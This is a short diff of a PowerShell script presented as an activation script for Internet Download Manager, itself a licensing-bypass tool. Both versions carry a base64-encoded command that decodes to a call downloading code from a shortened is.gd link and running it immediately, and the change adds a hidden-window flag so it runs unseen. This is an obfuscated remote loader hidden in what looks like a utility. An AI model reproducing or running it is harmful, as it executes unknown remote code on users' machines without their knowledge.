@@ -1,6 +1,6 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
+powershell -windowstyle hidden -command powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
 
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
